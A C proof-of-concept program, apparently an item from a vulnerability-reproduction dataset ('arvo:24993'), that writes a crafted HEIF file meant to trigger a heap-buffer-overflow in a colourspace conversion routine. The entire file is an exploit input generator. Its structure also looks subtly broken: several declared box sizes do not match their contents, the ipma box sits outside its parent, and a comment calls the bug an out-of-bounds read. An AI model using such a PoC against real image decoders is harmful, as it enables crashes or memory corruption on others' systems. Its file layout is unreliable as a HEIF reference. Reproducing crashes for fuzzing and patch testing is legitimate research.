#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:24993 */
/* Triggers: heap-buffer-overflow in Op_RGB_to_YCbCr<unsigned char>::convert_colorspace */
/* Vuln class: heap_buffer_overflow */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* HEIF file with proper ISOBMFF structure */
    /* ftyp box: size=24, type='ftyp', major_brand='mif1', minor_version=0, compatible_brands='heic' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x18, f); /* box size: 24 */
    fputc(0x66, f); fputc(0x74, f); fputc(0x79, f); fputc(0x70, f); /* 'ftyp' */
    fputc(0x6D, f); fputc(0x69, f); fputc(0x66, f); fputc(0x31, f); /* 'mif1' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* minor_version: 0 */
    fputc(0x68, f); fputc(0x65, f); fputc(0x69, f); fputc(0x63, f); /* 'heic' */

    /* meta box (FullBox): size=97, type='meta', version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x61, f); /* box size: 97 */
    fputc(0x6D, f); fputc(0x65, f); fputc(0x74, f); fputc(0x61, f); /* 'meta' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */

    /* hdlr box inside meta (FullBox): size=33, type='hdlr', version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x21, f); /* box size: 33 */
    fputc(0x68, f); fputc(0x64, f); fputc(0x6C, f); fputc(0x72, f); /* 'hdlr' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* pre_defined=0 */
    fputc(0x70, f); fputc(0x69, f); fputc(0x63, f); fputc(0x74, f); /* handler_type='pict' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* reserved[0] */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* reserved[1] */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* reserved[2] */
    fputc(0x00, f); /* name: null terminator */

    /* pitm box (FullBox): size=14, type='pitm', version=0, flags=0, item_ID=1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0E, f); /* box size: 14 */
    fputc(0x70, f); fputc(0x69, f); fputc(0x74, f); fputc(0x6D, f); /* 'pitm' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */
    fputc(0x00, f); fputc(0x01, f); /* item_ID=1 */

    /* iloc box (FullBox): size=20, type='iloc', version=0, flags=0 */
    /* offset_size=4, length_size=4, base_offset_size=0, index_size=0 */
    /* item_count=1, item_ID=1, construction_method=0, data_reference_index=0, base_offset=0, extent_length=1000 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x14, f); /* box size: 20 */
    fputc(0x69, f); fputc(0x6C, f); fputc(0x6F, f); fputc(0x63, f); /* 'iloc' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */
    fputc(0x44, f); /* offset_size=4, length_size=4 */
    fputc(0x00, f); fputc(0x01, f); /* item_count=1 */
    fputc(0x00, f); fputc(0x01, f); /* item_ID=1 */
    fputc(0x00, f); /* construction_method=0 */
    fputc(0x00, f); /* data_reference_index=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* base_offset=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f); /* extent_length=1000 */

    /* iinf box (FullBox): size=22, type='iinf', version=0, flags=0 */
    /* item_count=1, item_ID=1, item_protection_index=0, item_type='hvc1' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x16, f); /* box size: 22 */
    fputc(0x69, f); fputc(0x69, f); fputc(0x6E, f); fputc(0x66, f); /* 'iinf' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */
    fputc(0x00, f); fputc(0x01, f); /* item_count=1 */
    fputc(0x00, f); fputc(0x01, f); /* item_ID=1 */
    fputc(0x00, f); /* item_protection_index=0 */
    fputc(0x68, f); fputc(0x76, f); fputc(0x63, f); fputc(0x31, f); /* item_type='hvc1' */
    fputc(0x00, f); /* item_name: null */

    /* iprp box containing ipco with ispe and hvcC properties */
    /* iprp box: size=100, type='iprp' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x64, f); /* box size: 100 */
    fputc(0x69, f); fputc(0x70, f); fputc(0x72, f); fputc(0x70, f); /* 'iprp' */

    /* ipco box: size=92, type='ipco' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x5C, f); /* box size: 92 */
    fputc(0x69, f); fputc(0x70, f); fputc(0x63, f); fputc(0x6F, f); /* 'ipco' */

    /* ispe property (FullBox): size=16, type='ispe', version=0, flags=0 */
    /* width=256, height=256 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x10, f); /* box size: 16 */
    fputc(0x69, f); fputc(0x73, f); fputc(0x70, f); fputc(0x65, f); /* 'ispe' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); /* width=256 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); /* height=256 */

    /* hvcC configuration box (size=68, type='hvcC') */
    /* This contains a minimal HEVC configuration that will decode to a small image */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x44, f); /* box size: 68 */
    fputc(0x68, f); fputc(0x76, f); fputc(0x63, f); fputc(0x43, f); /* 'hvcC' */
    /* Fill with HEVC configuration data */
    for (int i = 0; i < 60; i++) {
        fputc(0x00, f);
    }

    /* ipma box (FullBox): size=12, type='ipma', version=0, flags=0 */
    /* association_count=1, item_ID=1, property_index=1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0C, f); /* box size: 12 */
    fputc(0x69, f); fputc(0x70, f); fputc(0x6D, f); fputc(0x61, f); /* 'ipma' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* version=0, flags=0 */
    fputc(0x00, f); fputc(0x01, f); /* entry_count=1 */
    fputc(0x00, f); fputc(0x01, f); /* item_ID=1 */
    fputc(0x01, f); /* property_index=1, essential=0 */

    /* mdat box: size=1000, type='mdat' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f); /* box size: 1000 */
    fputc(0x6D, f); fputc(0x64, f); fputc(0x61, f); fputc(0x74, f); /* 'mdat' */

    /* Write crafted image data that triggers the overflow */
    /* The vulnerability occurs when width/height cause subsampling to read beyond buffer */
    /* Use specific pixel data pattern to trigger OOB read during YCbCr conversion */
    for (int i = 0; i < 984; i++) {
        fputc(0xFF, f); /* Fill with max pixel values */
    }

    fclose(f);
    return 0;
}